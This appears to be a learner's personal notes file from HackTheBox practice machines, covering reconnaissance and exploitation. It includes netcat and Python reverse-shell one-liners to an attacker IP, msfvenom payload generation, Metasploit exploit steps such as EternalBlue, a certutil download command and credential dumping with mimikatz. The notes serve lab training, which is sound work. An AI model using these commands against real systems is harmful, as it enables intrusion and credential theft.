### Host files from current dir 
` python -m SimpleHttpServer 8080 `
 
### python tools for network 
https://github.com/SecureAuthCorp/impacket

### Given a string, cut at delimiter ( space) and take 4th field as a result
cut -d " " -f 4  

## Recon

### Website tech identification
whatweb - Kali cli tool for identifying site ( better than most)

Wappalyzer - extension on browser

### netdiscover - arp in the network

netdiscover -r 192.168.88.0/24

### nmap
-sS - "Stealh scan" (not really , just syn, synack and RST - no sessions established) 

nmap -sS 192.168.88.128

nmap -T4 -p- -A

-p- - all ports  ( default is top 1000 ports) ;   -A - scan everything , version, OS, fingerprint

### SMB (and metasploit workflow)

msfconsole

search smb 

use auxiliary/scanner/smb/smb_version 

set RHOSTS 192.168.88.128

run

### nice to knows 
dpkg -i downloaded_package.deb  # install a package

### reverse shell ( just like pentestmonkey )
nc 192.168.1.1 4444 -e /bin/sh        --->   nc -lvp 4444

### bind shell 
nc 192.168.1.1 4444     ---->  nc -lvp 4444 -e /bin/sh

### Foxyproxy productivity 
use foxyproxy addon and add burpsuite settings to it. easy switching 


## Legacy
nmap -sS -p- 10.10.10.4 

nmap -A -p139,445,3389 10.10.10.4

nmap --script vuln -p445 10.10.10.4    ( looked at write-up for this to scan for vulns )

Find MS08-067(works) and  ms17-010(doesnt work)   Eternalblue.

search -f user.txt    , same for root. gg

learned from video :  getuid - windows whoami equivalent , sysinfo - obvious, help - meterpreter help ( lots of useful commands) ;
getsystem attempts to privesc ( might be a bit reckless)

## Lame
nmap --script vuln -p3632 10.10.10.3

3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

distcc indicated as vulnerable, msf unix/misc/distcc_exec gives shell

find / -user root -perm -4000 -print 2>/dev/null      ( find binaries with root privs)

elevate privileges with nmap ( should learn something new instead...)

https://pentestlab.blog/category/privilege-escalation/  

## blue
as name indicates

nmap --script vuln -p445 10.10.10.3   reports windows/smb/ms17_010_eternalblue)

didnt work on first try, resetted machine, tried other exploits, but this one eventually worked. 

##### video stuff
original exploit uses generic shell, but it is possible to "set payload windows/x64/meterpreter/reverse_tcp"  for improvement

*Autoblue* can be used and can deselect meterpreter (OSCP lol) . more manual and not msf

postexploit in windows: hashdump(meterpreter) , route print(shell) , arp -a(shell) , netstat -ano ( shell), ps (meterpreter)

meterpreter > load kiwi, mimikatz , a lot of stuff. Kiwi  : samdump, dumpsecrets

## devel
IIS7 with file upload by FTP. 

making payloads with msfvenom

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.36 LPORT=4444 -f aspx -o shell.aspx 

Needed write-up because new to IIS shells, and windows privesc. 

set payload windows/meterpreter/reverse_tcp

msf5 > use exploit/multi/handler

msf5 exploit(multi/handler) > set lhost 10.10.14.36

msf5 exploit(multi/handler) > set lport 4444

background and session management.. anyway all thanks to https://x64.moe/hackthebox%20walkthrough%20:%20devel/

use post/multi/recon/local_exploit_suggester    ## for local exploits, new for me

##### video stuff
/usr/share/wordlists/ for dirbuster and other tools

FTP : if file transfer is failing, switch to binary mode with "I" option

privesc : sometimes inside meterpreter "getsystem" is enough lol ( not here)

### undisclosed machine

privesc  : sudo -l  .  nano file import

### jerry

weak password
*admin:admin* for status viewer. 

error on other paths:
<user username="tomcat" password="s3cret">  is actual pass   . Tomcat manager web shell upload.

Java server pages web shell

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.26 LPORT=4444 -f war >shell.war

#### video : 
for cred in $(cat file.txt);do echo -n $cred | base64; done    . example of 1 line bash

certutil  -urlcache -f http://10.10.14.26/sh.exe   // download over certutil (WIN) 
### Nibbler

sudo -l again. more php shells.

### optimum
using compiled winprivesc exploits ( ms16-32)
win exploits 
https://www.fuzzysecurity.com/tutorials/16.html
python2 windows-exploit-suggester.py --database 2020-01-14-mssb.xls --systeminfo ../systeminfo.txt --quiet
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
not much different video from https://alamot.github.io/optimum_writeup/ 

### Bashed
user - embarassing /dev/ folder find by nikto into the php shell.
reverse shells not just nc... can also be python. one liner: 
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.26",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
file creation and edit time can be a hint...  ( learned from write-up..) 
#### video lesson 
while impersonating: sudo -u scriptmanager /bin/bash  will transfer you into shell on behalf of scriptmanager, without *su* command. 


### Grandpa
2017-7269, iis6 webdav.
exploit suggester - > exploit/windows/local/ms14_058_track_popup_menu

### Grandma

